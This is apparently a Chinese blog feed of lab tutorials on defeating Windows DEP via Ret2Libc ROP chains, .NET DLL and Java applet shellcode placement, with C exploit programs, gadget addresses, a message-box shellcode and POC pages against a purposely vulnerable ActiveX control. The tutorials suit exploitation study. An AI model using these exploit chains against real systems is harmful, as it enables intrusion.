    "\x0B\x1A\xBF\x7C"            // pop pop retn
    "\xBA\xD9\xBB\x7C"            // 修正EBP
    "\x5F\x78\xA6\x7C"            // pop retn
    "\x08\x00\x14\x00"            // 弹出机器码在可执行空间的起始地址，转入执行用
    "\x00\x00\x14\x00"            // 可执行内存空间地址，复制用
    "\xBF\x7D\xC9\x77"            // push esp jmp eax && 跳转至(pop pop retn地址)
    "\xFF\x00\x00\x00"            // shellcode 长度
    "\xAC\xAF\x94\x7C"            // memcpy入口
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void test()
{
    char str[176];
    //__asm int 3
    memcpy(str, shellcode, 450);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();
    return 0;
}
</code></pre>

<h4 id="1-2-实验内容"><a href="#1-2-实验内容" class="headerlink" title="1.2 实验内容"></a>1.2 实验内容</h4><p><b>实验思路</b></p>
<ol>
<li>禁用GS和SafeSEH</li>
<li>test存在溢出</li>
<li>覆盖返回地址后，通过Ret2Libc技术，利用memcpy函数将shellcode复制到可读可写可执行区域</li>
<li>最后在这段可执行的内存空间中执行shellcode，实现DEP的绕过</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows 2003 SP2</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optout</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>VC 6.0</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>debug版本</td>
</tr>
</tbody>
</table>
<p>在OllyDbg中可以看出，在0x00140000的位置，Access和Initial Access都是RWE，这代表这一段是可读可写可执行的内存，长度为0x1000。</p>
<ol>
<li>源内存起始地址  <font color="#f00">[ebp+0xC]</font>，用push esp jmp eax指令地址来填充，push esp后这个位置会覆盖为当前esp，以实现源内存起始地址的动态获取</li>
<li>复制字符串长度：0xFF  <font color="#f00">[ebp+0x10]</font></li>
<li>目的地址0x00140000  <font color="#f00">[ebp+0x8]</font></li>
</ol>
<p>实验中，溢出字符串起始地址0x0012FDB0，返回地址0x0012FE68<br>pop eax retn地址:0x7C84178A<br>pop pop retn地址:0x7CBF1A0B(pop ebx pop edi retn)<br>修正EBP retn 4地址:0x7CBBD9BA(push esp pop ebp retn 4)<br>pop ecx retn地址:0x7CA6785F<br>push esp jmp eax地址:0x77C97DBF(用于跳转)<br>memcpy入口地址:0x7C94AFAC</p>
<h3 id="2-利用-NET"><a href="#2-利用-NET" class="headerlink" title="2. 利用.NET"></a>2. 利用.NET</h3><p>实验支持:</p>
<ol>
<li>具有溢出漏洞的ActiveX控件</li>
<li>包含shellcode的.NET控件</li>
<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
</ol>
<h4 id="2-1-ActiveX控件"><a href="#2-1-ActiveX控件" class="headerlink" title="2.1 ActiveX控件"></a>2.1 ActiveX控件</h4><p>ActiveX控件</p>
<pre><code>
void CVulnerAX_DEPCtrl::test(LPCTSTR str)
{
    // AFX_MANAGE_STATE(AfxGetStaticModuleState());
    // TODO: Add your dispatch handler code here
    printf("aaaa");
    char dest[100];
    sprintf(dest, "%s", str);
}
</code></pre>

<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>优化</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>MFC</td>
<td>在静态库中使用MFC</td>
<td>工程属性-&gt;General-&gt;Use of MFC</td>
</tr>
<tr>
<td>字符集</td>
<td>使用Unicode字符集</td>
<td>工程属性-&gt;General-&gt;Character Set</td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p>编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32</p>
<h4 id="2-2-包含shellcode的-NET控件"><a href="#2-2-包含shellcode的-NET控件" class="headerlink" title="2.2 包含shellcode的.NET控件"></a>2.2 包含shellcode的.NET控件</h4><font color="#f00">在VS2008中C#下边建立一个DLL解决方案</font>

<p><img src="/images/2017-07-12/net.jpg" alt="C#下建立的DLL解决方案"></p>
<p>包含shellcode的.NET控件代码</p>
<pre><code>
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DEP_NETDLL
{
    public class Class1
    {
        public void Shellcode()
        {
            string shellcode = 
                "\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
                "\uff53\ufc57\uff53\uf857";
        }
    }
}

</code></pre>

<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>基址</td>
<td>0x24240000</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>Debug版本</td>
<td>Release版本的优化会影响shellcode</td>
</tr>
</tbody>
</table>
<p>设置DLL的基址方法如下：&quot;Project-&gt;Properties-&gt;Build-&gt;Advanced&quot;<br><img src="/images/2017-07-12/set_dll_address.jpg" alt="设置DLL基址"></p>
<h4 id="2-3-POC及测试"><a href="#2-3-POC及测试" class="headerlink" title="2.3 POC及测试"></a>2.3 POC及测试</h4><p>编译好DLL之后，需要将DLL和溢出ActiveX控件的POC页面放到同一目录下，并通过如下调试代码调用</p>
<pre><code>&lt;object classID="DEP_NETDLL.dll#DEP_NETDLL.Shellcode"&gt;&lt;/object&gt;
</code></pre>

<p>Shellcode设置好后，就来设置POC页面，并将POC页面与.NET控件放到一台WEB服务器上，在实验机上访问这个POC页面，以触发ActiveX中的溢出漏洞，通过.NET控件绕过DEP。</p>
<p>POC页面如下</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;object classID=&quot;DEP_NETDLL.dll#DEP_NETDLL.Class1&quot;&gt;&lt;/object&gt;
&lt;object classid=&quot;clsid:053CC2BD-8E24-4E01-A950-9FF689F40487&quot; id=&quot;test&quot;&gt;&lt;/object&gt;
&lt;script&gt;
var s = &quot;\u9090&quot;;
while(s.length &lt; 54){
    s += &quot;\u9090&quot;;
}
s += &quot;\u24E2\u2424&quot;;
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p><b>实验解释：</b></p>
<ol>
<li>为了简单地反映绕过DEP的过程，本实验所攻击的ActiveX控件不启用GS</li>
<li>通过web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的.NET控件</li>
<li>ActiveX控件中的test函数存在典型的溢出</li>
<li>编译.NET控件的时候，我们设置DLL的基址，所以我们将函数的返回地址覆盖为.NET控件中的shellcode起始地址，进而转入shellcode执行</li>
<li>实验使用Unicode编码，在计算填充长度时要考虑Unicode与Ascii编码之间的长度差问题</li>
</ol>
<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>DEP</td>
<td>Optout</td>
<td></td>
</tr>
<tr>
<td>浏览器</td>
<td>IE6</td>
</tr>
</tbody>
</table>
<p>当弹出下面所示对话框时用OllyDbg附加IE的进程，附加好后按一下F9键让程序继续运行。<br><img src="/images/2017-07-12/ie.jpg" alt="对话框"></p>
<p>然后转到DEP_NETDLL.dll的内存空间中查找shellcode的具体位置，然后进入该内存空间。</p>
<p>shellcode的起始地址0x242424DF。而我们填充的字符串起始地址0x01EFF534，函数返回地址0x01EFF5A0，所以填充108（0x6C）字节就可以覆盖返回地址。</p>
<font color="#f00">令人意外的是，我们无法包含dll文件，使用了所有可能的办法，都无法在html中使用dll</font>

<h3 id="3-利用java-applet"><a href="#3-利用java-applet" class="headerlink" title="3. 利用java applet"></a>3. 利用java applet</h3><p>实验支持:</p>
<ol>
<li>具有溢出漏洞的ActiveX控件</li>
<li>包含shellcode的Java Applet控件</li>
<li>可以触发ActiveX控件中溢出漏洞的POC页面</li>
</ol>
<h4 id="3-1-ActiveX控件"><a href="#3-1-ActiveX控件" class="headerlink" title="3.1 ActiveX控件"></a>3.1 ActiveX控件</h4><p>上一讲已经介绍</p>
<h4 id="3-2-包含shellcode的Java-Applet控件"><a href="#3-2-包含shellcode的Java-Applet控件" class="headerlink" title="3.2 包含shellcode的Java Applet控件"></a>3.2 包含shellcode的Java Applet控件</h4><p>实验代码</p>
<pre><code>
import java.applet.*;
import java.awt.*;
public class Shellcode extends Applet{
    public void init(){
        Runtime.getRuntime().gc();
        StringBuffer buffer = new StringBuffer(255);
        buffer.append("\u9090\u9090\u9090\u9090\u9090\u9090\u9090\u9090" +
                "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91" +
                "\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332" +
                "\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c" +
                "\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505" +
                "\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b" +
                "\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06" +
                "\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c" +
                "\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd" +
                "\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33" +
                "\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050" +
                "\uff53\ufc57\uff53\uf857");
    }
}
</code></pre>

<p>编译成class文件后，在Web中通过如下代码调用<br>    <applet code="class文件名.class"></applet></p>
<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>Java JDK</td>
<td>1.4.2</td>
<td></td>
</tr>
<tr>
<td>目标版本</td>
<td>1.1</td>
<td>脱离JRE，在不具有JRE机器上也能执行</td>
</tr>
<tr>
<td>编译指令</td>
<td>javac 路径\Shellcode.java -target 1.1</td>
</tr>
</tbody>
</table>
<h4 id="3-3-POC及其利用"><a href="#3-3-POC及其利用" class="headerlink" title="3.3 POC及其利用"></a>3.3 POC及其利用</h4><p>编译产生的Shellcode.class与POC放到同一目录下</p>
<p>POC页面代码</p>
<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;applet code=Shellcode.class width=300 height=50&gt;&lt;/applet&gt;
&lt;script&gt;alert("开始溢出:");&lt;/script&gt;
&lt;object classid="clsid:053CC2BD-8E24-4E01-A950-9FF689F40487" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while(s.length &lt; 54){
    s += "\u9090";
}
s += "\u04FC\u1001";
test.test(s);
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>代码解释:</p>
<ol>
<li>ActiveX不使用GS</li>
<li>通过Web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的Java applet控件</li>
<li>java applet的内存空间中具有可执行权限，所以我们的shellcode有执行的机会</li>
<li>ActiveX控件中的test函数存在典型的溢出</li>
<li>将函数的返回地址覆盖为Java Applet中的.text段的shellcode起始地址，进而转入shellcoe中执行</li>
<li>实验用Unicode编码，需要考虑Unicode与Ascii之间的转换</li>
</ol>
<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optout</td>
<td></td>
</tr>
<tr>
<td>JRE状态</td>
<td>启用</td>
<td></td>
</tr>
<tr>
<td>Java JDK</td>
<td>1.4.2</td>
<td>不要使用高版本的JRE，否则Java applet申请的内存不在IE进程中</td>
</tr>
<tr>
<td>浏览器</td>
<td>IE6</td>
</tr>
</tbody>
</table>
<p>在浏览器中启用JRE：Internet选项-&gt;高级-&gt;Java-&gt;将Java……用于&lt;applet&gt;</p>
<p>当弹出“开始溢出”对话框时用OllyDbg附加IE进程，附加好后用F9继续执行。而shellcode地址可以通过OllyFindAddr插件中的Custom-Search搜索弹出对话框机器码的前4字节&quot;FC686A0A&quot;来定位shellcode</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DEP </tag>
            
            <tag> windows </tag>
            
            <tag> .Net </tag>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻击DEP的方法（上）——Ret2Libc]]></title>
      <url>/2017/07/09/%E6%94%BB%E5%87%BBDEP%E7%9A%84%E6%96%B9%E6%B3%95-%E4%B8%8A/</url>
      <content type="html"><![CDATA[<h2 id="利用Ret2Libc挑战DEP"><a href="#利用Ret2Libc挑战DEP" class="headerlink" title="利用Ret2Libc挑战DEP"></a>利用Ret2Libc挑战DEP</h2><p>让代码跳转到已经存在的系统函数中就不会被DEP拦截，Ret2libc攻击就是这个原理。（Return to libc）。简言之，就是shellcode的每条指令都可以在代码区中找到一条替代指令。但是这种方法太繁重，而且不好控制栈帧。<br><img src="/images/2017-07-09/ret2libc.jpg" alt="ret2libc具体流程"></p>
<p>所以有以下三种方法：</p>
<ol>
<li>通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行</li>
<li>通过跳转到VirtualProtect函数将shellcode所在内存页设置爱为可执行状态，然后在转入shellcode执行</li>
<li>通过跳转到VirtualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到段内存中执行</li>
</ol>
<h3 id="1-Ret2Libc之利用ZwSetInformationProcess"><a href="#1-Ret2Libc之利用ZwSetInformationProcess" class="headerlink" title="1. Ret2Libc之利用ZwSetInformationProcess"></a>1. Ret2Libc之利用ZwSetInformationProcess</h3><h4 id="1-1-ZwSetInformationProcess简介"><a href="#1-1-ZwSetInformationProcess简介" class="headerlink" title="1.1 ZwSetInformationProcess简介"></a>1.1 ZwSetInformationProcess简介</h4><p>API函数ZwQueryInformationProcess和ZwSetInformationProcess进行查询和修改(有些资料中是NtQueryInformationProcess和NtSetInformationProcess)。</p>
<p>进程的DEP设置标识保存在KPROCESS结构中的_KEXECUTE_OPTIONS上。</p>
<pre><code>_KEXECUTE_OPTIONS
Pos0 ExecuteDisable: 1bit
Pos1 ExecuteEnable: 1bit
Pos2 DisableThunkEmulation: 1bit
Pos3 Permanent: 1bit
Pos4 ExecuteDispatchEnable: 1bit
Pos5 ImageDispatchEnable: 1bit
Pos6 Spare: 2bit
</code></pre>

<p>前4个bit与DEP有关，当前进程DEP开启时ExecuteDisable位为1，当前进程DEP关闭时ExecuteEnable位为1，DisableThunkEmulation是为了兼容ATL程序设置的，Permanent被置为1后表示这些标志位都不能被修改。</p>
<pre><code>NtSetInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
);
</code></pre>

<p>第一个参数为进程句柄，设置为-1表示当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS；第四个参数为第三个参数的长度。于是，最终的参数设置为：</p>
<pre><code>
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;
ZwSetInformationProcess(
    NtCurrentProcess(),        // (HANDLE)-1
    ProcessExecuteFlags,    // 0x22
    &ExecuteFlags,            // ptr to 0x2
    sizeof(ExecuteFlags)    // 0x4
);
</code></pre>

<p>但是问题是函数参数中会包含0x00这样的截断字符。其实解决办法是微软的兼容性考虑：如果一个进程的Permanent位没设置，当它加载DLL时，系统会对这个DLL进行DEP兼容性检查，当存在兼容性问题时进程的DEP就会关闭。为此微软设立了LdrpCheckNXCompatibility函数，当符合下列条件之一进程的DEP就会被关闭：</p>
<ol>
<li>当DLL受SafeDisc版权保护系统保护时</li>
<li>当DLL包含有.aspcak、.pcle、.sforce等字节时</li>
<li>Windows Vista下面当DLL包含在注册表&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions&quot;键下边标识出不需启动DEP的模块时</li>
</ol>
<p>以SafeDisc为例，查看Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程：<br><img src="/images/2017-07-09/safedisc.jpg" alt="具体流程"></p>
<p>我们可以模拟这个过程，从0x7C93CD24入手关闭DEP，这个地址可通过OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3来搜索<br><img src="/images/2017-07-09/find_addr.jpg" alt="DEP起始地址"><br>由于只有CMP AL,1 成立的情况下程序继续执行，所以需要一个指令将AL修改为1。将AL修改为1后让程序转到0x7C93CD24执行，在执行0x7C93CD6F处的RETN 4时DEP已经关闭，此时如果我们可以在RETN到一个精心构造的指令地址上，就可能转入shellcode中执行。<br><img src="/images/2017-07-09/retn_4.jpg" alt="跳转地址"></p>
<h4 id="1-2-实验代码"><a href="#1-2-实验代码" class="headerlink" title="1.2 实验代码"></a>1.2 实验代码</h4><pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x52\xE2\x92\x7C"        // MOV EAX, 1   RETN地址
    "\x85\x8B\x1D\x5D"        // 修正EBP
    "\x19\x4A\x97\x7C"        // 增大ESP
    "\xB4\xC1\xC5\x7D"        // jmp esp
    "\x24\xCD\x93\x7C"        // 关闭DEP代码的起始位置
    "\xE9\x33\xFF\xFF\xFF\x90\x90\x90";    // 回跳指令

void test()
{
    char str[176];
    //__asm int 3
    strcpy(str, shellcode);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();
    return 0;
}
</code></pre>

<h4 id="1-3-Windows-XP-SP3实验内容"><a href="#1-3-Windows-XP-SP3实验内容" class="headerlink" title="1.3  Windows XP SP3实验内容"></a>1.3  Windows XP SP3实验内容</h4><p><b>实验思路：</b></p>
<ol>
<li>为了更直观，将不启用GS和SafeSEH</li>
<li>函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖函数返回地址</li>
<li>将函数的返回地址覆盖为类似MOV AL,1 retn的指令，在将AL置1后转入0x7C93CD24关闭DEP</li>
<li>DEP关闭后shellcode就可以正常执行</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optout</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>VC 6.0</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>debug版本</td>
</tr>
</tbody>
</table>
<font color="#f00">由于不知道如何设置VC6.0的release版本的禁用编译优化选项，所以直接使用了Debug版本！其实查看是否被优化，可以设置int 3断点，查看后续指令是否按照正常顺序执行！</font>

<p>从上面的OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3搜索结果可以看出，step2提供了符合“将AL置1并收回程序控制权”要求的指令。本次使用0x7C92E252。<br>经过测试得到溢出字符串的起始地址:0x0012FDB0<br>test函数的返回地址:0x0012FE64<br>覆盖返回地址:0x7C92E252</p>
<p>调试发现，收回程序控制权之后，EIP修改为红框表示的值。所以为了让程序转入关闭DEP，需要返回地址后添加4字节0x7C93CD24。<br><img src="/images/2017-07-09/ret_addr.jpg" alt="接受程序控制权"></p>
<p>重新编译调试，根据Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程可以知道，在0x7c93CD29处的跳转是将ESI的值赋给[EBP-4]，但是EBP在溢出的时候被破坏了，目前EBP-4的位置并不可写入，所以程序异常。<br><img src="/images/2017-07-09/edit_ebp.jpg" alt="给ebp-4地址赋值"></p>
<p>所以在转入0x7C93CD24前，需将EBP指向一个可写的位置，为此可以通过PUSH ESP POP EBP RETN的指令将EBP定位到一个可写的位置，此指令在Disable DEP-&gt;Disable DEP&lt;=XP SP3的step3部分可以查看。但是若用此指令序列，若直接将ESP的值赋给EBP返回后，ESP相对于EBP位于高址位置，当有入栈操作时EBP-4可能被冲刷掉，所以用PUSH ESP POP EBP RETN 4来修正。此处使用的0x5D1D8B85处的地址。</p>
<p>当进入0x7C93CD33处的函数后，可以看到EBP-4中的内容已经被冲刷掉，内容修改为0x22，而_KEXECUTE_OPTIONS结构中只有前4位有关，0x22(00100010)代表关闭DEP。<br><img src="/images/2017-07-09/ZwSetInformationProcess.jpg" alt="ZwSetInformationProcess设置"></p>
<p>虽然关闭了DEP，但是失去了进程的控制权。<br><img src="/images/2017-07-09/ret_addr2.jpg" alt="失去控制权"></p>
<p>当ESP小于EBP时，可以用减小ESP或者增大EBP的方法。由于shellcode位于内存低址，所以减小ESP可能会破坏shellcode，所以可以增大EBP，但是本实验找不到！变通的方法是增大ESP到安全位置，让EBP和ESP之间的空间足够大，这样压栈就不会冲刷EBP内容。<br>可以用OllyFindAddr插件中的Overflow return address-&gt;POP RETN+N选项查找指令。我们选择0x7C974A19处的RETN 0x28来增大ESP。</p>
<p>这其中的关系有点绕，所以我也不打算继续讲了，需要我们进行实际调试！</p>
<p><b>最终的shellcode组成</b></p>
<ol>
<li>【操作7】168字节的弹出对话框机器码</li>
<li>12字节的0x90填充</li>
<li>【操作1】将AL置1，并重新掌握控制权 &quot;\x52\xE2\x92\x7C&quot;</li>
<li>【操作2】修正EBP &quot;\x85\x8B\x1D\x5D&quot;</li>
<li>【操作3】增大ESP &quot;\x19\x4A\x97\x7C&quot;</li>
<li>【操作5】 JMP ESP至最后一段 &quot;\xB4\xC1\xC5\x7D&quot;</li>
<li>【操作4】关闭DEP &quot;\x24\xCD\x93\x7C&quot;</li>
<li>【操作6】回跳至shellcode &quot;\xE9\x33\xFF\xFF\xFF\x90\x90\x90&quot;</li>
</ol>
<h4 id="1-4-Windows-Server-2003-SP2实验内容"><a href="#1-4-Windows-Server-2003-SP2实验内容" class="headerlink" title="1.4 Windows Server 2003 SP2实验内容"></a>1.4 Windows Server 2003 SP2实验内容</h4><font color="#f00">我的实验是用的Windows Server 2003 Enterprise SP2</font>

<p>由于windows 2003 SP2对LdrpCheckNXCompatibility函数进行了少许修改，导致该函数在执行的过程中会对ESI指向的内存附近进行操作。所以可以利用push esp pop esi retn来调整ESI，这些指令在Disable DEP-&gt;Disable DEP&gt;=2003 SP2搜索结果的step4部分。</p>
<p>变通的方法：</p>
<ol>
<li>找到pop eax retn指令，并让程序转入该位置执行</li>
<li>找到一条pop esi retn指令，并保证在执行1中的pop eax时对它的地址位于栈顶，这就可以将地址放到eax中</li>
<li>找到push esp jmp eax指令，并转入执行</li>
</ol>
<p>最终windows server 2003 sp2测试时对应的代码为：</p>
<pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xE9\x77\xBE\x77"        // 修正EBP
    "\x81\x71\xBA\x7C"        // pop eax retn
    "\x0A\x1A\xBF\x7C"        // pop pop pop retn
    "\xA5\x6F\xBE\x7C"        // pop esi retn
    "\xBF\x7D\xC9\x77"        // push esp jmp eax
    "\x5F\xFB\x87\x7C"        // retn 0x30
    "\x17\xF5\x96\x7C"        // 关闭DEP代码的起始位置
    "\x23\x1E\x1A\x7D"        // jmp esp
    "\xE9\x27\xFF\xFF\xFF\x90\x90\x90";  // jmp shellcode

void test()
{
    char str[176];
    //__asm int 3
    strcpy(str, shellcode);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();
    return 0;
}
</code></pre>

<p>溢出字符串开始地址：0x0012FDB0<br>返回地址所在位置：0x0012FE64<br>修正EBP地址：0x77BE77E9 (push esp pop ebp retn 4)<br>pop eax retn所在地址: 0x7CbA7181<br>由于retn 4，所以下面一条指令在0x7CBA7181后面4字节处，但是由于先pop eax，所以应该返回值0x7CBA7181后8字节处进行push esp jmp eax的操作: 0x77C97DBF<br>然后通过jmp eax跳回去执行pop esi retn指令（0x7CBA7181后面4字节处）：0x7CBE6FA5</p>
<p>然后就是执行增大ESP，创造足够大的空间：0x7C87FB5F<br>然后关闭DEP：0x7C96F517(这里直接进入了ZwSetInformationProcess所在路径)</p>
